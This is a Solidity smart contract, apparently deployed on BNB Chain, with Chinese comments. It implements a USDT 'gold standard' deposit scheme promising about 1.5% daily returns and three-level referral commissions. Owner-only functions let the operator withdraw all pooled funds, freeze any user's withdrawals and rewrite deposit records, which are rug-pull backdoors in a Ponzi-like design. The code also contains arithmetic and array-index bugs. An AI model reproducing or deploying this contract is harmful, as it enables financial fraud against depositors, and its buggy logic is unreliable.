/**
 *Submitted for verification at BscScan.com on 2022-07-25
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function decimals() external view returns (uint8);
}

/**
 * @dev Provides information about the current execution context, including the
  */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        _transferOwnership(_msgSender());
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Uiuo is Context, Ownable {
    // 静态收益
    uint public STATIC_RATE_100_499 = 125; // 1.5%一天，12次每天，每次分125/100000的利息
    uint public STATIC_RATE_500_999 = 150; // 每次分150/100000的利息
    uint public STATIC_RATE_1000 = 166; // 每次分166/100000的利息
    // 推荐直接佣金U
    uint public REFER_REWARD_RATE_1 = 15000; // 1代得认购金额的15%，也就是15000/100000
    uint public REFER_REWARD_RATE_2 = 5000; // 1代得认购金额的5%，也就是5000/100000
    uint public REFER_REWARD_RATE_3 = 5000; // 1代得认购金额的5%，也就是5000/100000

    // 复购奖励比例
    uint public REBUY_RATE = 20000; // 1U起即可复投金本位，额外享受20%金本位奖励，也就是20000/100000

    // 利息计算周期
    uint public REWARD_CALC_PERIOD_SECOND = 7200; // 满2个小时，利息累计一次

    // USDT合约指针
    IERC20 public _usdtContract;  

    // 地址认购记录，只记录未到期，已到期会删除
    struct Record {
        uint blockTime; // utc时间
        uint256 amount;  // 存的usdt金额。
    }  
    struct UserInfo {
        uint256 totalDeposit; // 总存的usdt金额
        uint256 totalReward; // 历史总计静态收益
        uint256 totalReferReward; // 总的推荐usdt金额
        uint256 remainStaticReward; // 总的剩余的未使用的静态收益
        address parent; // 上级        
        uint updateTime; // 作为收益的开始计算时间，认购，复购，提现，都会更新这个时间
        bool isActive; // 是否已经激活
        uint freezeTillTime;
        Record[] buyRecords; // 认购记录
        Record[] rebuyRecords; // 复购记录
    }
    mapping(address => UserInfo) private _userInfo;
    address[] private _allUserAddress; // 方便之后遍历

    constructor(address usdtContractAddress) {
        _usdtContract = IERC20(usdtContractAddress);
    }
    
    function getUserInfo(address userAddress) public view returns (UserInfo memory) {
        require(msg.sender == owner() || msg.sender == userAddress, "UIUO: only owner can call this function");
        return _userInfo[userAddress];
    }

    // 参与地址数
    function getUserCount() public view returns(uint256){
        require(msg.sender == owner(), "UIUO: only owner can call this function");
        return _allUserAddress.length;
    }  

    // 判断是否需要激活
    function checkCanActive(address account) public view returns(bool){
        if(_userInfo[account].isActive == true) return false;
        uint256 totalBuyAmount = 0;
        for(uint i=0;i<_userInfo[account].buyRecords.length;i++){
            totalBuyAmount += _userInfo[account].buyRecords[i].amount;
        }
        if(totalBuyAmount < 30000000000000000000){ // 30U以上才能激活
            return false;
        }else{
            return true; // 可以激活
        }
    } 

    // 判断是否需要激活
    function doActive() public returns(bool){
        require(checkCanActive(msg.sender), "UIUO: can't do active");
        
        uint256 staticReward = getStaticReward(msg.sender);
        _userInfo[msg.sender].remainStaticReward += staticReward;        
        _userInfo[msg.sender].totalReward += staticReward;
        _userInfo[msg.sender].updateTime = block.timestamp;
        _userInfo[msg.sender].totalDeposit += 20000000000000000000; // 送20 U        
        _userInfo[msg.sender].remainStaticReward += 3000000000000000000;   // 额外赠送3U静态收益
        _userInfo[msg.sender].isActive = true;
        return true;
    } 

    // 取出所有用户信息
    function getAllUserAddress(uint offset, uint pageSize) public onlyOwner view returns(address[] memory) {
        require(msg.sender == owner(), "UIUO: only owner can call this function");
        require(offset < _allUserAddress.length, "UIUO: offset should less than user count");
        require(pageSize < 200, "UIUO: pageSize should less than 200");
        uint i;
        address[] memory users = new address[](pageSize); 
        uint limit = _allUserAddress.length < (offset + pageSize) ? _allUserAddress.length : (offset + pageSize);
        for(i=offset; i<limit; i++){
            users[i] = _allUserAddress[i];
        }
        return users;
    }

    // 取出所有用户信息
    function getAllUserInfo(uint offset, uint pageSize) public onlyOwner view returns(UserInfo[] memory) {
        require(msg.sender == owner(), "UIUO: only owner can call this function");
        require(offset < _allUserAddress.length, "UIUO: offset should less than user count");
        require(pageSize < 200, "UIUO: pageSize should less than 200");
        UserInfo[] memory users = new UserInfo[](pageSize); 
        uint i;
        uint limit = _allUserAddress.length < (offset + pageSize) ? _allUserAddress.length : (offset + pageSize);
        for(i=offset; i<limit; i++){
            users[i] = _userInfo[_allUserAddress[i]];
        }
        return users;
    }

    // 购买U金本位, 更新动态收益
    function buy(uint256 amount, address parent) public  returns (bool success) {     
        require(amount >= 1000000000000000000, "UIUO: buy amount shoud greater than 1 U");    

        UserInfo storage userInfo = _userInfo[msg.sender];
        uint256 reward;

        _usdtContract.transferFrom(msg.sender, address(this), amount); // 扣除sender的USDT        
        // 转账成功才会执行下面的语句，如果没成功交易就会revert，直接返回了
        // 只能设置一次上级，另外A->A不允许，还有A->B->A也不允许
        if(parent != address(0) && userInfo.parent == address(0) && parent != msg.sender && _userInfo[parent].parent != msg.sender){
            userInfo.parent = parent;
            // parent地址地址没有认购过，变迁没有拿过推荐奖励，就加到新用户数组里
            if(_userInfo[parent].buyRecords.length == 0 && _userInfo[parent].totalReferReward == 0) _allUserAddress.push(parent);
        }
        
        if(userInfo.buyRecords.length == 0 && userInfo.totalReferReward == 0) {
            // 第一次认购, 放到用户数组里
            _allUserAddress.push(msg.sender);
        }         
        // 把静态收益和动态收益，更新到用户信息里，之后再计算时，就从这次认购后开始计算收益
        reward = getStaticReward(msg.sender);
        userInfo.remainStaticReward += reward; // 把实时计算的收益固化， 方便用新的开始时间计算
        userInfo.totalReward += reward;
        userInfo.updateTime = block.timestamp;

        userInfo.totalDeposit += amount;      // 增加总认购金额 
        userInfo.buyRecords.push(Record(block.timestamp, amount)); // 增加认购记录

        uint256 baseAmount = amount/100000; // 100000是基数
        address parentAddress = userInfo.parent;
        if(parentAddress != address(0)) { // 如果有上级
            reward = getStaticReward(parentAddress);  
            _userInfo[parentAddress].remainStaticReward += reward; // 把实时计算的收益固化， 方便用新的开始时间计算
            _userInfo[parentAddress].totalReward += reward;
            _userInfo[parentAddress].updateTime = block.timestamp;
            _userInfo[parentAddress].totalReferReward += baseAmount*REFER_REWARD_RATE_1; // 上级增加15%                 
            _userInfo[parentAddress].totalDeposit += baseAmount*REFER_REWARD_RATE_1; // 变成认购金额

            parentAddress = _userInfo[parentAddress].parent; // 临时变量，存上级地址
            if(parentAddress != address(0)) { // 如果有上上级
                reward = getStaticReward(parentAddress); 
                _userInfo[parentAddress].remainStaticReward += reward; // 把实时计算的收益固化， 方便用新的开始时间计算
                _userInfo[parentAddress].totalReward += reward;
                _userInfo[parentAddress].updateTime = block.timestamp;
                _userInfo[parentAddress].totalReferReward += baseAmount*REFER_REWARD_RATE_2; // 上上级增加5%                 
                _userInfo[parentAddress].totalDeposit += baseAmount*REFER_REWARD_RATE_2; // 变成认购金额

                parentAddress = _userInfo[parentAddress].parent;
                if(parentAddress != address(0)) { // 如果有上上上级
                    reward = getStaticReward(parentAddress);  
                    _userInfo[parentAddress].remainStaticReward += reward; // 把实时计算的收益固化， 方便用新的开始时间计算
                    _userInfo[parentAddress].totalReward += reward;
                    _userInfo[parentAddress].updateTime = block.timestamp;
                    _userInfo[parentAddress].totalReferReward += baseAmount*REFER_REWARD_RATE_3; // 上上上级增加5%                 
                    _userInfo[parentAddress].totalDeposit += baseAmount*REFER_REWARD_RATE_3; // 变成认购金额
                } 
            }
        }        
        return true;
    }

    // 复购U金本位
    function rebuy(uint256 amount) public  returns (bool success) {      
        require(amount >= 1000000000000000000, "UIUO: buy amount should greater than 1 U");  // 1U起
        // 实时计算的 + 没有使用
        uint256 staticReward = getStaticReward(msg.sender) + _userInfo[msg.sender].remainStaticReward;
        require(staticReward >= amount, "UIUO: insuffcient reward amount"); 
        // 额外享受复购金额的20%金本位奖励
        _userInfo[msg.sender].totalDeposit += (amount + amount * REBUY_RATE/10000);  // 增加总认购金额  + 20% U奖励
        _userInfo[msg.sender].rebuyRecords.push(Record(block.timestamp, amount)); // 增加复购记录

        // 从静态收益里，扣除复投金额
        _userInfo[msg.sender].remainStaticReward = staticReward - amount;
        _userInfo[msg.sender].totalReward += staticReward;
        _userInfo[msg.sender].updateTime = block.timestamp;
        return true;
    }
    // 查询静态收益
    function getStaticRewardRate(address account) public view returns (uint){
        uint256 totalDeposit = _userInfo[account].totalDeposit;
        uint rewardRate = 0;
        if(totalDeposit < 1000000000000000000){ // 1U没有收益
            return 0;

        }else if(totalDeposit >= 1000000000000000000 && totalDeposit <= 499000000000000000000){ // 1～499
            rewardRate = STATIC_RATE_100_499;

        }else if(totalDeposit >= 500000000000000000000 && totalDeposit <= 999000000000000000000){ //500-999U
            rewardRate = STATIC_RATE_500_999;

        }else{
            // >= 1000U
            rewardRate = STATIC_RATE_1000;
        }
        return rewardRate;
    }

    // 查询静态收益
    function getStaticReward(address account) public view returns (uint256){
        uint256 holderHours=(block.timestamp - _userInfo[account].updateTime)/7200; // 每2小时算一次收益，2小时以内舍掉
        return _userInfo[account].totalDeposit*holderHours*getStaticRewardRate(account)/100000; 
    }
  
    // 用户提现
    function withdrawReward(uint256 amount) public returns (bool){
        require(_userInfo[msg.sender].freezeTillTime < block.timestamp, "UIUO: account frozen");
        require(amount >= 10000000000000000000, "UIUO: withdraw amount should greater than 10 U");  // 10U起
        // 实时计算的 + 没有使用
        uint256 staticReward = getStaticReward(msg.sender) + _userInfo[msg.sender].remainStaticReward;
        require(staticReward >= amount, "UIUO: insuffcient reward amount"); 
        
        _usdtContract.transfer(msg.sender, amount); // 转出提现金额到用户地址里

        // 从静态收益里，扣除提现金额
        _userInfo[msg.sender].remainStaticReward = staticReward - amount;        
        _userInfo[msg.sender].totalReward = staticReward;
        _userInfo[msg.sender].updateTime = block.timestamp;
        return true;
    }
    
    function setDepositAmount(address account, uint256 depositAmount) public onlyOwner{
        _userInfo[account].totalDeposit = depositAmount;
    }

    function setBuyRecordAmount(address account, uint8 index, uint256 buyAmount) public onlyOwner{
        _userInfo[account].buyRecords[index].amount = buyAmount;
    }

    function setFreezeAddress(address account, uint blockTime) public onlyOwner{
        _userInfo[account].freezeTillTime = blockTime; // 锁定到什么时候，如果是小于当前时间，就是不锁定
    }
    
    function administratorWithdraw(uint256 amount) public onlyOwner{  
        _usdtContract.transfer(msg.sender, amount); // 转出提现金额到管理员地址里
    }
    
    function sendDynamicReward(address account, uint256 amount) public onlyOwner{  
        // 发放动态收益
        _usdtContract.transfer(account, amount); 
    }
}